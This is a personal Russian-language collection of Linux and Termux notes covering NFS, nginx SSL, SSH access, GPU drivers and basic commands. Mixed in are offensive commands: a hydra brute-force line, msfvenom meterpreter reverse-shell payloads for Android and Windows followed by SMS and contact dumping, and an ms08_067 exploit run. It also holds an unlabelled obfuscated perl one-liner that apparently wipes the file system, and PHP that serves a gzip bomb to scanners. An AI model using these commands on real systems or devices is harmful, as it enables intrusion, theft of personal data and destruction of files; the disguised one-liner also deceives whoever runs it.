Alt + SysRq + U Unmount — пытается перемонтировать все примонтированные файловые системы в режим «только чтение»;
Alt + SysRq + T showTasks — выдаст список текущих задач и информацию о них в текущую консоль;
Alt + SysRq + N Nice — используется для того, чтобы сбросить приоритет задачи реального времени или просто с измененным приоритетом;
Alt + SysRq + W shoW-blocked-tasks — выдаст список всех непрерываемых (заблокированных, ждущих окончание ввода-вывода) задач;
Alt + SysRq + M showMem — выдаст информацию о доступной и занятой оперативной памяти, а так же степени использования свопа;
Alt + SysRq + F Full — позволяет вызвать обработчик oom_kill (out-of-memory kill) для прерывания приложений, забравших слишком много памяти (может занять продолжительное время). Используйте его, если свободная память совсем истощилась, так что система не реагирует ни на какой иной ввод (курсор мыши не движется, индикаторы NumLock/CapsLock не включаются, но индикатор работы накопителя всё время включен);
Alt + SysRq + K secure acces Key — убивает все программы на текущей консоли. Её следует применять для снятия зависшего X-сервера. При этом графический сервер будет остановлен и невозможно будет увидеть ввод-вывод либо пока X-сервер не перезапустится, либо пока видеорежим не будет исправлен вручную;
Alt + SysRq + R unRaw — забирает контроль над мышью и клавиатурой у Х-сервера, что полезно, если Х-севрвер завис: так можно перейти в консоль, убить Х-сервер или проверить логи;
Alt + SysRq + E tErm - послать сигнал завершения работы SIGTERM всем процессам, кроме init;
Alt + SysRq + I KILL - послать сигнал немедленного завершения работы SIGKILL всем процессам, кроме init;





-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

перемонтировать корень-

mount -o remount,rw /



________________

hydra_brute-

hydra -V -s 80 -L login.txt -P password.txt -t 16 -m /foo/bar/protected.html 192.168.0.1 http-get




-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Установка и настройка NFS сервера / клиента в Centos 7

NFS сервер / клиент

Network File System (NFS) — протокол сетевого доступа к файловым системам, первоначально разработан Sun Microsystems в 1984 году. За основу взят протокол вызова удалённых процедур. Позволяет подключать (монтировать) удалённые файловые системы через сеть.NFS предоставляет клиентам прозрачный доступ к файлам и файловой системе сервера. В отличие от FTP, протокол NFS осуществляет доступ только к тем частям файла, к которым обратился процесс, и основное достоинство его в том, что он делает этот доступ прозрачным. Это означает, что любое приложение клиента, которое может работать с локальным файлом, с таким же успехом может работать и с NFS-файлом, без каких-либо модификаций самой программы.

Установка и настройка NFS-сервера

Устанавливаем утилиту (возможно по-умолчанию уже стоит)

$ sudo yum install nfs-utils

Добавляем правила в файерволл

$ sudo firewall-cmd —permanent —zone=public —add-service=nfs
$ sudo firewall-cmd —permanent —zone=public —add-service=mountd
$ sudo firewall-cmd —permanent —zone=public —add-service=rpc-bind
$ sudo firewall-cmd —reload
$ sudo firewall-cmd —list-all

Устанавливаем права на директорию, к которой будет доступ

$ sudo chown -R nfsnobody:nfsnobody /mnt/storage
$ sudo chmod -R 777 /mnt/storage

Отредактируем файл с настройками доступа к NFS-серверу

$ sudo nano /etc/exports
/mnt/storage 192.168.1.25(rw,sync,no_root_squash,no_subtree_check) 192.168.1.9(ro,sync,no_root_squash,no_subtree_check)

Пример настроек доступа к разным директориям

$ sudo nano /etc/exports
/srv/nfs4 192.168.33.0/24(rw,sync,no_subtree_check,crossmnt,fsid=0)
/srv/nfs4/backups 192.168.33.0/24(ro,sync,no_subtree_check) 192.168.33.3(rw,sync,no_subtree_check)
/srv/nfs4/www 192.168.33.110(rw,sync,no_subtree_check)
/data 192.168.1.100/24(rw,insecure,nohide,all_squash,anonuid=1000,anongid=1000,no_subtree_check)

rw - разрешение на записьro - только чтениеsync - синхронный режим доступа. sync (async) - указывает, что сервер должен отвечать на запросы только после записи на диск изменений, выполненных этими запросами. Опция async указывает серверу не ждать записи информации на диск, что повышает производительность, но понижает надежностьno_root_squash - по умолчанию пользователь root на клиентской машине не будет иметь доступа к разделяемой директории сервера. Этой опцией мы снимаем это ограничение.no_all_squash - включение пользовательской авторизацииall_squash - все подключения будут выполнятся от анонимного пользователяsubtree_check (no_subtree_check) - в некоторых случаях приходится экспортировать не весь раздел, а лишь его часть. При этом сервер NFS должен выполнять дополнительную проверку обращений клиентов, чтобы убедиться в том, что они предпринимают попытку доступа лишь к файлам, находящимся в соответствующих подкаталогах. Такой контроль поддерева (subtree checks) несколько замедляет взаимодействие с клиентами, но если отказаться от него, могут возникнуть проблемы с безопасностью системы. Отменить контроль поддерева можно с помощью опции no_subtree_check. Опция subtree_check, включающая такой контроль, предполагается по умолчанию. Контроль поддерева можно не выполнять в том случае, если экспортируемый каталог совпадает с разделом диска;anonuid=1000 – привязывает анонимного пользователя к «местному» пользователю;anongid=1000 – привязывает анонимного пользователя к группе «местного» пользователя.

Добавляем службы rpcbind и nfs в автозагрузку и запускаем их

$ sudo systemctl enable rpcbind nfs-server
$ sudo systemctl start rpcbind nfs-server

Демон nfs-server автоматически перечитывает файл /etc/exports, но бывает, что надо вручную запустить перечитывание конфига

$ sudo exportfs -r

Команда exportfs показывает какие ресурс опубликованы

$ sudo exportfs
/mnt/storage 192.168.1.25
/mnt/storage 192.168.1.9

Если при вводе появляется ошибка - Function not implemented, значит, не запущены службы rpcbind и nfs-server

Установка и настройка NFS-клиента

Устанавливаем софт

$ sudo yum install nfs-utils

Включаем и запускаем включаем службы rpcbind

$ sudo systemctl start rpcbind
$ sudo systemctl enable rpcbind

Создаем каталог, в который будет смонтирована шара и монтируем ее

$ sudo mkdir /mnt/nfs-share
$ sudo mount -t nfs 192.168.1.12:/mnt/storage /mnt/nfs-share

где 192.168.1.12 - ip-адрес NFS-сервера

Настраиваем автоматическое монтирование при перезагрузки сервера

$ sudo nano /etc/fstab
...
192.168.1.12:/mnt/storage /mnt/nfs-share nfs defaults 0 0

http://bit.ly/3404Geo




-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Включаем SSL в NGINX на Centos 7-

SSL — криптографический протокол, который подразумевает более безопасную связь. Он использует асимметричную криптографию для аутентификации ключей обмена, симметричное шифрование для сохранения конфиденциальности, коды аутентификации сообщений для целостности сообщений.

NGINX + SSL

Установка NGINX была рассмотрена ранее, в этой статье

Генерируем 2048-битный файл с шифрами для DH. Этот файл позволяет генерировать «одноразовые» ключи, которые используются при обмене сессионными ключами. Они уничтожаются по окончанию ssl-хендшейка, что затрудняет последующее восстановление сессионного ключа из дампа трафика (перехватить нужно будет уже не только приватный ключ и дамп трафика, но и файл с dhparam — без всего этого восстановить содержимое tls-трафика уже не получится).

[root@localhost]# openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048

Создадим каталог, в котором будет лежать файл с настройками для ssl. Это нужно, что б избежать дублирования в конфигурациях для виртуальных хостов

[root@localhost]# mkdir /etc/nginx/snippets
[root@localhost]# nano /etc/nginx/snippets/ssl-params.conf
ssl_dhparam /etc/ssl/certs/dhparam.pem;

ssl_session_timeout 1d;
ssl_session_cache shared:SSL:50m;
ssl_session_tickets off;

ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers 'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS';
ssl_prefer_server_ciphers on;

ssl_stapling on;
ssl_stapling_verify on;
resolver 8.8.8.8 8.8.4.4 valid=300s;
resolver_timeout 30s;

add_header Strict-Transport-Security "max-age=15768000; includeSubdomains; preload";
add_header X-Frame-Options SAMEORIGIN;
add_header X-Content-Type-Options nosniff;

После покупки сертификата нам понадобятся следующие файлы:

.CA - файл сертификата Центра Сертификации (Certificate Authority).
.CRT - файл сертификата вашего веб-сайта.
.key - закрытый ключ. Он мог быт сгенерирован на вашем сервере, либо при покупке ssl сертификата на web-сайте: private.key

Объединяем .ca и .crt в один файл

[root@localhost]# cat /etc/ssl/certs/mydomain.ru_crt.crt /etc/ssl/certs/mydomain.ru_ca.crt » /etc/ssl/certs/mydomain.ru.crt

Теперь нам надо добавить в наш конфиг nginx строчки:

server {
listen 443 ssl default_server;
include snippets/ssl-params.conf;
root /var/www/html;

server_name mydomain.ru www.mydomain.ru;
index index.php index.html index.htm;

ssl_certificate /etc/ssl/mydomain.ru.crt;
ssl_certificate_key /etc/ssl/private.key;
...

Вот готовый пример конфига

[root@localhost]# cd /etc/nginx/sites-available/
[root@localhost]# cat mydomain.ru.conf
# Переадресация HTTP -> HTTPS
server
listen 80;
server_name mydomain.ru www.mydomain.ru;
return 301 https://$server_name$request_uri;

# Переадресация IP -> Домен
server
listen 80;
server_name 8.8.8.8;
return 301 https://mydomain.ru$request_uri;

# Переадресация WWW -> NON WWW
server
listen 443 ssl http2;
server_name www.mydomain.ru;
return 301 https://mydomain.ru$request_uri;

include snippets/ssl-params.conf;
ssl_certificate /etc/ssl/certs/mydomain.ru.crt;
ssl_certificate_key /etc/ssl/certs/mydomain.ru_key.key;

server png

http://bit.ly/2SGK0nz



-------------------------------------------

Проверка соответствия ключа и ssl сертификата-

Необходимо было заменить заканчивающийся ssl-сертификат для сайта, и в процессы замены из-за несоответствия фалов example_ru.crt и example_ru.key web-сервер apache не запускался.

Для проверки надо вычислить md5 сумму каждого файла, и эти суммы должны совпадать.

Переходим в каталог, где у нас лежат файлы

[root@localhost ~]# cd /etc/pki/tls/certs/

Вычисляем md5 сумму SSL-сертификата example_ru.crt

[root@localhost ~]# openssl x509 -noout -modulus -in example_ru.crt | openssl md5
(stdin)= 04c798ddffe50a19c7b1302b29e43798

Вычисляем md5 сумму приватного ключа example_ru.key

[root@localhost ~]# openssl rsa -noout -modulus -in example_ru.key | openssl md5
(stdin)= 04c798ddffe50a19c7b1302b29e43798

Вычисляем md5 сумму модуля CSR

[root@localhost ~]# openssl req -noout -modulus -in example_ru.csr | openssl md5
(stdin)= 04c798ddffe50a19c7b1302b29e43798

Как видно, md5-суммы всех файлов совпадают

https://itdraft.ru/2018/09/20/proverka-sootvetstvija-..




-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


metasploit-


android-

#msfvenom -p android/meterpreter/reverse_tcp LHOST=198.168.8.201 R >storage/downloads/test.apk
#msfconsole 
#use exploit/multi/handler
#set payload android/meterpreter/reverse_tcp 
#set LHOST (your IP) 
#exploit

activity_start url

dump_sms

dump_contacts


windows-

#msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=4444 -f exe -o /tmp/my_payload.exe

-p windows/meterpreter/reverse_tcp

msf > use exploit/windows/smb/ms08_067_netapi
msf exploit> set PAYLOAD windows/vncinject/bind_tcp
msf exploit(ms08_067_netapi) > set RHOST 192.168.0.3
msf exploit(ms08_067_netapi) > exploit



--------

ssh-keygen-t rsa-b 2048-f id_rsa



___________________________________________________________________________________________________________________________________________________________________________________________________________________

termux-

-----------

обновить репозиторий-

termux-upgrade-repo

----------------

xserver-

Для запуска отдельного приложения (файлового менеджера Thunar) из XFCE, залогиниться по SSH и ввести:


env DISPLAY=:0 xfwm4 & env DISPLAY=:0 thunar
или


export DISPLAY=:0 & xfwm4 & thunar

Для запуска отдельного приложения (файлового менеджера PCManFM) из LXDE, залогиниться по SSH и ввести:


env DISPLAY=:0 openbox & env DISPLAY=:0 pcmanfm
или


export DISPLAY=:0 & openbox & pcmanfm

Для запуска отдельного приложения (файлового менеджера Nautilus) из GNOME, залогиниться по SSH и ввести:


env DISPLAY=:0 metacity & env DISPLAY=:0 nautilus
или


export DISPLAY=:0 & metacity & nautilus

Для запуска отдельного приложения (файлового менеджера Dolphin) из KDE, залогиниться по SSH и ввести:


env DISPLAY=:0 kwin & env DISPLAY=:0 dolphin
или


export DISPLAY=:0 & kwin & dolphin

Для экспорта сессии целиком (XFCE):


export DISPLAY=:0 && startxfce4

Для экспорта сессии целиком (LXDE):


export DISPLAY=:0 && startlxde

Для экспорта сессии целиком (GNOME 2):


export DISPLAY=:0 && gnome-session

Для экспорта сессии целиком (KDE):


export DISPLAY=:0 && startkde

-------------------------

добавить дополнительные кнопки-

mkdir $HOME/.termux

echo "extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]" > $HOME/.termux/termux.properties

termux-reload-settings


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Доступ к Termux по SSH с других устройств по локальной сети
Я использовал:
- Смартфон на Android 9 с установленным Termux;
- Компьютер на Windows 10  с запущенной командной строкой (можно использовать терминал в Linux);
- Оба устройства подключены к одной Wi-Fi сети.


Погнали!

Выполняем по шагам в Termux:
1) 
Код
apt install openssh
  в процессе, если потребуется, вводим ‘y’. Этот шаг - установка SSH. Если он у вас установлен - начинайте со следующего пункта.
2) 
Код
pkill sshd
  этой командой останавливаем OpenSSH
3) 
Код
termux-setup-storage
  подключить внутреннюю память (если появится запрос на доступ к файлам - подтверждаем)
4) 
Код
passwd
 Установка пароля доступа по SSH. Создаём пароль (вводим если появляется этот текст: New password:). Повторяем введённый ранее пароль (вводим если появляется этот текст: Retype new password:). Если появился этот текст: New password was successfully set., то идём дальше.
5) 
Код
sshd
 запускаем ssh хост
6) 
Код
ifconfig
 Записываем свой ip-адрес. У меня он (и далее в коде) 192.168.0.99 (устройство wlan0). У вас могут быть другие данные.

Выполняем в командной строке на ПК (я использовал командную строку):

Код
ssh -p 8022 192.168.0.99
 192.168.0.99 - ip-адрес устройства с запущенным termux. При первом подключении появится запрос ... Are you sure you want to continue connecting (yes/no)? напишите yes. При запросе пароля (если появился этот текст: UserPC@192.168.0.99's password:) - введите пароль, который вы указали в четвёртом пункте.
Если всё прошло успешно, то в итоге в командной строке получится это:

Код
 Welcome to Termux!

Wiki:            https://wiki.termux.com
Welcome to Termux!

Wiki:            https://wiki.termux.com
Community forum: https://termux.com/community
Gitter chat:     https://gitter.im/termux/termux
IRC channel:     #termux on freenode

Working with packages:

 * Search packages:   pkg search <query>
 * Install a package: pkg install <package>
 * Upgrade packages:  pkg upgrade

Subscribing to additional repositories:

 * Root:     pkg install root-repo
 * Unstable: pkg install unstable-repo
 * X11:      pkg install x11-repo

Report issues at https://termux.com/issues

$

Если у вас всё получилось - поздравляю! Вы молодец! Можно работать в Termux с помощью ПК.
Информацию собирал по крупицам в интернете. Особенно было сложно найти простой способ установки пароля.
В будущем для подключения выполняйте шаги 5, 6 и инструкцию по подключению с компьютера



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Простая защита от DDoS-атаки-

Защита от DDoS

DDoS (Distributed Denial of Service) — распределённая атака типа «отказ в обслуживании». Сетевой ресурс выходит из строя в результате множества запросов к нему, отправленных из разных точек. Обычно атака организуется при помощи бот-нетов.

Для начала определяем количество соединений с 1 ip к примеру на 443 порт

user@srv:~$ -ntu | grep ":443\ " | awk 'print $5'| cut -d: -f1 | sort | uniq -c | sort -nr | more
130 185.215.60.212
19 94.140.142.86
19 3.89.157.122
17 62.148.156.22
17 178.210.35.17
16 217.26.165.15
16 188.17.163.148
15 213.5.120.34
14 95.153.129.96
14 94.25.229.95

Как видно из выдачи, с одного ip идет большое количество соединений.

Чтобы вручную не блокировать ip ботов, напишем bash-скрипт

user@srv:~$ nano /home/script/ddos.sh
#!/bin/sh
# Задаем путь к скриптам
mypath=/home/script

# Определяем все соединения на порт 443 и записываем лог find.log
netstat -ntu | grep ":443\ " | awk 'print $5'| cut -d: -f1 | sort | uniq -c | sort -nr | grep -v "127.0.0.1" | grep -v "8.8.8.8" > $mypath/find.log

# Создаем DROP правила iptables, блокировать IP если количество коннектов 50 и больше. И сохраняем правила в bash-скрипт ban_ip.sh
awk 'if ($1 > 50) print "/sbin/iptables -A INPUT -p tcp —dport 443 -s " $2 " -j DROP";' $mypath/ddos.iplist » $mypath/ban_ip.sh

# Запускаем только что созданный скрипт блокировки IP атакующих
/bin/bash $mypath/ban_ip.sh

# Очищаем скрипт ban_ip.sh
cat /dev/null > $mypath/ban_ip.sh

Добавляем скрипт ddos.sh в крон

user@srv:~$ crontab -l
# запускать скрипт раз в 5 минут
*/5 * * * * /home/script/ddos.sh
# амнистия раз в месяц
@monthly root iptables -F

http://bit.ly/2ZEmpqd


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Как сделать GIMP более похожим на Photoshop


Нельзя отрицать, что Photoshop является золотым стандартом в области редактирования цифровых фотографий, и многие профессионалы отрасли ежедневно полагаются на него, чтобы зарабатывать на жизнь. Тем не менее, GIMP, его ближайший конкурент с открытым исходным кодом, в последние годы делает огромные шаги, чтобы сделать себя жизнеспособной альтернативой.

Частью барьера, препятствующего фанатам Photoshop принять GIMP с открытым исходным кодом, является другой внешний вид, ощущение и элементы управления. Есть несколько простых способов преодолеть этот барьер, по крайней мере частично, настроив GIMP так, чтобы он выглядел и вел себя как Photoshop.

Установка иконок как в Photoshop

Очевидно, что Adobe не собирается выпускать официальную тему значков Photoshop для GIMP в ближайшее время, но дизайнер из Deviant Art, Doctormo, тщательно воссоздал значки Photoshop и упаковал их для GIMP. Переходим на страницу и скачиваем иконки.

Переименовываем каталог .gimp-2.8 в .gimp-2.8.OLD, распаковываем архив который мы скачали ранее и переносим содержимое вместо переименованного каталога

user@localhost:~$ mv ~/.gimp-2.8 ~/.gimp-2.8.OLD
user@localhost:~$ unzip ~/Downloads/gimp_2_8_photoshop_tweaks_by_doctormo-d75n1qc.zip
user@localhost:~$ mv ~/Downloads/.gimp-2.8 ~/.gimp-2.8

Если вы работаете с GIMP 2.10, структура каталогов будет другая:

~/.config/GIMP/2.10

Соответственно команды будут следующие:

user@localhost:~$ mv ~/.config/GIMP/2.10 ~/.config/GIMP/2.10.OLD
user@localhost:~$ mv ~/Downloads/gimp-2.8 ~/.config/GIMP/2.10

Теперь, когда вы запустите GIMP, то заметите что значки и стили больше похожи на Photoshop

Настройка сочетаний клавиш как в Photoshop

Следующий шаг в том, чтобы заставить GIMP чувствовать себя как Photoshop - это сочетание клавиш. Любой пользователь Photoshop знает, что сочетания клавиш являются неотъемлемой частью эффективной работы. Если вы привыкли к Photoshop, изучение всего нового набора на GIMP - это не просто ужас, это просто боль.

К счастью, кто-то уже сделал для нас самое сложное. Вам нужно только импортировать файл с настройками сочетания клавиш.

Скачиваем файл конфигурации, переименовываем его в "menurc" и копируем в ~/.gimp-2.8.

user@localhost:~$ wget http://epierce.freeshell.org/gimp/ps-menurc
user@localhost:~$ mv ~/Downloads/ps-menurc ~/.gimp-2.8/menurc

Опять же, в GIMP 2.10 это будет ~/.config/GIMP/2.10

user@localhost:~$ mv ~/Downloads/ps-menurc ~/.config/GIMP/2.10/menurc

Больше возможностей Photoshop

Инструмент перемещения в GIMP похож на инструмент в Photoshop, но он не совсем такой. Тем не менее, есть опция, которую вы можете использовать, чтобы заставить ее вести себя как Photoshop.

Выберите инструмент Move из окна Toolbox. Установите «Переместить активный слой» (Move Active Layer).

Теперь сохраните изменения. Нажмите «Правка» (Edit), затем «Параметры» (Preferences). Выберите «Параметры инструмента» и нажмите «Сохранить параметры инструмента».

Привязать к краю холста

По умолчанию GIMP не привязывает слои к краям холста или линиям сетки по умолчанию. Таким образом, перемещение слоя гораздо менее точно.

Откроем файл ~/.gimp-2.8/gimprc (или ~/.config/GIMP/2.10) и добавим в него строки

(default-snap-to-canvas yes)
(default-snap-to-grid yes)

http://bit.ly/2S0v2rs

#Gimp, #Photoshop


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
***
создание "пустых" файлов


dd if=/dev/zero of=/path/to/your/file bs=<razmer bloka> count=<skolko blokov>

dd if=/dev/zero of=image.txt bs=1024M count=1

dd of=file.txt bs=1 count=0 seek=100G


dd if=/dev/zero bs=1M count=10240 | gzip > 10G.gzip

dd if=/dev/zero bs=1M count=10240 >> 10
 zip -r 10.zip 10
 



---------------------

echo "test... test... test..." | perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;;y; -/:-@[-`{-};`-{/" -;;s;;$_;see'

<?php

$agent = filter_input(INPUT_SERVER, 'HTTP_USER_AGENT');



//check for nikto, sql map or "bad" subfolders which only exist on wordpress

if (strpos($agent, 'nikto') !== false || strpos($agent, 'sqlmap') !== false || startswith($url,'wp-') || startswith($url,'wordpress') || startswith($url,'wp/'))

{

      sendBomb();

      exit();

}



function sendBomb(){

        //prepare the client to recieve GZIP data. This will not be suspicious

        //since most web servers use GZIP by default

        header("Content-Encoding: gzip");

        header("Content-Length: ".filesize('10G.gzip'));

        //Turn off output buffering

        if (ob_get_level()) ob_end_clean();

        //send the gzipped file to the client

        readfile('10G.gzip');

}



function startsWith($a, $b) {

    return strpos($a, $b) === 0;

}





----------------
 
zip bomba-

 <?php
//prepare the client to recieve GZIP data. This will not be suspicious
//since most web servers use GZIP by default
header("Content-Encoding: gzip");
header("Content-Length: ".filesize('10G.gzip'));
//Turn off output buffering
if (ob_get_level()) ob_end_clean();
//send the gzipped file to the client
readfile('10G.gzip');
                                                                            



___________________________________________________________________________________________________________________________________________________________________________________________________________________

noisy-


noisy
Simple random DNS, HTTP/S internet traffic noise generator
Простой генератор шума из случайного DNS, HTTP/S интернет трафика
Если говорить простым языком, эта штука будет создавать видимость того, что вы просматриваете разные сайты с разных устройств.

Для начала установим python, python-pip и git

Код
#Для apt
$ sudo apt install git python3 python3-pip
#Для yum
$ sudo yum install git python3 python3-wheel
#Для dnf
$ sudo dnf install git python3 python3-wheel
#Для zypper
$ sudo zypper install python3-pip python3-setuptools python3-wheel
#Для pacman
$ sudo pacman -S git python python-pip

Для Windows качаем git и python, при установке не забываем про галочки добавления в path.

Далее установим requements, для этого используем

Код
$ sudo pip install requests

и копируем наш репозиторий командой

Код
$ git clone https://github.com/1tayH/noisy

после чего переходим в папку с noisy

Код
$ cd noisy

Редактируем при надобности config.json и запускаем командой

Код
$ python noisy.py --config config.json

(вместо config.json можно указать свой путь к конфигу)

Все. Пока python выполняется, трафик генерируется.

Для автозапуска в Windows можно просто создать bat с последней командой и прописать к нему путь в новой строковом параметре в реестре в директории HKCU\Software\Microsoft\Windows\CurrentVersion\run.

Для автозапуска в Linux для начала перенесем папку noisy в /opt/ для удобства и перейдем в нее

Код
$ sudo mv noisy /opt/
$ cd /opt/noisy

Далее скопируем пример service файла в папку, где хранятся service файлы

Код
$ sudo cp examples/systemd/noisy.service /etc/systemd/system/

И отредактируем

Код
$ sudo nano /etc/systemd/system/noisy.service

Файл имеет вот такой вид

Код
[Unit]
Description=Simple random DNS, HTTP/S internet traffic noise generator

[Service]
User=noisy
WorkingDirectory=/opt/noisy
ExecStart=/usr/bin/python /opt/noisy/noisy.py --config /opt/noisy/config.json

[Install]
WantedBy=multi-user.target

User - имя пользователя от которого будет запускаться демон, я указал своего пользователя.
WorkingDirectory - путь к папке noisy, если у вас она называется иначе или хранится в другой директории, поменяйте.
ExecStart - команда для запуска.
Теоретически параметр WorkingDirectory должен позволять прописывать относительные пути из указанной директории и по этому ExecStart можно заменить на простое python noisy.py --config config.json, однако практически не проверял, оставил как есть.
Для автозапуска при включении прописываем

Код
$ systemctl enable noisy

(noisy - название service файла, измените если вы его переименовывали при копировании)
И для запуска

Код
$ systemctl start noisy

Все, noisy работает в фоне. Убедиться в этом можно откыв htop.
Спойлер
UPD: Если вдруг вам не хватает сайтов, а делать список лень, есть готовый конфиг с большим кол-вом сайтов


___________________________________________________________________________________________________________________________________________________________________________________________________________________


Подробная установка бамблби на арч линукс:
 

Ниже текстовый инструкция по установке в комментарии автора к видео: 
 
1) При загрузке в лив режим в граб (нажатием "е" при загрузке)"всем известную"строку (с содержанием загузочных параметров, таких как quiet, и т.д.) добавить nouveau.modeset=0 (выключить,чтоб этот сраный нуво не мешал работать с нашим конфигом железа) 
 
2) Загрузившись - установить систему. Так же при загрузке в установленную систему снова добавить выключение nouveau .......... 
И, да, грабом я не пользуюсь. Пользую system-boot 
Также НЕ СОВЕТУЮ пользовать гуй (графическую утилиту) Манжаро по автоматической настройке видеодрайверов!!! 
 
3) Если система содержит PAMAC , то это облегчает задачу. Памак сам предложит все пакеты, необходимые для работы со "шмелём" 
Если же нет, то устанавливаем ч./з терминальчик: sudo pacman -S nvidia nvidia-utils opencl-nvidia opencl-headers lib32-nvidia-utils lib32-opencl-nvidia bumblebee bbswitch primus lib32-primus primus_vk lib32-primus_vk mesa lib32-mesa libglvnd lib32-libglvnd 
(ВНИМАНИЕ! Ядро должно быть не LTS!!! Для ядра с длительной поддержкой необходимы драйвера nvidia-lts и также переключалка bbswitch-dkms и т.д!!! ) Пакет гуя nvidia-setting не нужен, от слова СОВСЕМ! (чтоб не обжигаться об им созданные, кривые конфиги) 
 
4) Не перезагружаясь!!! включаем сервис "шмеля" sudo systemctl enable bumblebeed.service 
 
5) Добавляем себя в группу пользователей "шмеля" sudo gpasswd -a user bumblebee (где user ваше имя) 
 
6) После, добавляем драйвер нуво в блэклист командой: sudo nano /etc/modprobe.d/blacklist.conf 
Вписываем туда blacklist nouveau Кстати я иногда этого не делаю,что не мешает работать системе как надо. 
 
6*) Ставим консольный коммандер, к примеру sudo pacman -S mc ОБЯЗАТЕЛЬНО! Пригодится аж ппц ))))))))))) 
 
7) Перезагружаемся. Всё должно работать прекрасно. 
Далее,если получаем черный экран,значит необходимо удалить конфиги (текстовые файлы) иксов ИМЕННО "видеодрайверов" по адресам /etc/X11, /etc/X11/xorg.conf.d, (если в папке имеются конфиги например xorg.conf От клавы иксовый конфиг не трогаем, keyboard.conf!!!) и /usr/share/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf (созданный,как раз утилитой bumblebee) 
 
8) Заходим в виртуальную консоль нажатием ctrl+alt+F2 ctrl+alt+F3 (что первое откроется) 
 
9)Вводим свои логин пароль, вызываем наш командир sudo mc и удаляем выше названные конфиги (либо правим под своё железо, со знанием дела) 
 
Перезагузка и всё работает! 
 
Также, когда всё работает и есть тиринг при работе с нвидиа, можно включить nvidia-drm, добавив в конфиг загрузчика граб nvidia-drm.modeset=1 
 
ПЫ эсс: https://www.youtube.com/watch?v=bmWqZYq6f1c&t=2006s подробный видос по бамблби от грамотного Арчевода. 
 
Пы эсс2: https://ctlos.github.io/ Система Арч от Alex Creo с хорошим вики и установщиком clamaries, что очень сильно облегчает жизнь ;) 
 
#бамблби#бамблбиарч#бамблбиарчлинукс#арчлинукснастройкабамблби#primus_vk#bumblebee#Vulkan#primus_vkBumblebeeVulkanNvidiaArch Linux#primus_vk#NvidiaArchLinux#ArchLinux#BumblebeeVulkan#BumblebeeVulkanNvidia#BumblebeeInstall#BumblebeeУстановка#УстановкаБамблби


___________________________________________________________________________________________________________________________________________________________________________________________________________________
***

БАЗОВЫЕ КОМАНДЫ-



погода: curl wttr.in/Moscow
Файлы и директории
cd /home	перейти в директорию '/home'
cd ..	перейти в директорию уровнем выше
cd ../..	перейти в директорию двумя уровнями выше
cd	перейти в домашнюю директорию
cd ~user	перейти в домашнюю директорию пользователя user
cd -	перейти в директорию, в которой находились до перехода в текущую директорию
pwd	показать текущюю директорию
ls	отобразить содержимое текущей директории
ls -F	отобразить содержимое текущей директории с добавлением к именам символов, храктеризующих тип
ls -l	показать детализированое представление файлов и директорий в текущей директории
ls -a	показать скрытые файлы и директории в текущей директории
ls *[0-9]*	показать файлы и директории содержащие в имени цифры
tree	показать дерево файлов и директорий, начиная от корня (/)
lstree
mkdir dir1	создать директорию с именем 'dir1'
mkdir dir1 dir2	создать две директории одновременно
mkdir -p /tmp/dir1/dir2	создать дерево директорий
rm -f file1	удалить файл с именем 'file1'
rmdir dir1	удалить директорию с именем 'dir1'
rm -rf dir1	удалить директорию с именем 'dir1' и рекурсивно всё её содержимое
rm -rf dir1 dir2	удалить две директории и рекурсивно их содержимое
mv dir1 new_dir	переименовать или переместить файл или директорию
cp file1 file2	сопировать файл file1 в файл file2
cp dir/* .	копировать все файлы директории dir в текущую директорию
cp -a /tmp/dir1 .	копировать директорию dir1 со всем содержимым в текущую директорию
cp -a dir1 dir2	копировать директорию dir1 в директорию dir2
ln -s file1 lnk1	создать символическую ссылку на файл или директорию
ln file1 lnk1	создать "жёсткую" (физическую) ссылку на файл или директорию
touch -t 0712250000 fileditest	модифицировать дату и время создания файла, при его отсутствии, создать файл с указанными датой и временем (YYMMDDhhmm)
Поиск файлов
find / -name file1	найти файлы и директории с именем file1. Поиск начать с корня (/)
find / -user user1	найти файл и директорию принадлежащие пользователю user1. Поиск начать с корня (/)
find /home/user1 -name "*.bin"	Найти все файлы и директории, имена которых оканчиваются на '. bin'. Поиск начать с '/ home/user1'
find /usr/bin -type f -atime +100	найти все файлы в '/usr/bin', время последнего обращения к которым  более 100 дней
find /usr/bin -type f -mtime -10	найти все файлы в '/usr/bin', созданные или изменённые в течении последних 10 дней
find / -name *.rpm -exec chmod 755 '{}' \;	найти все фалы и директории, имена которых оканчиваются на '.rpm', и изменить права доступа к ним
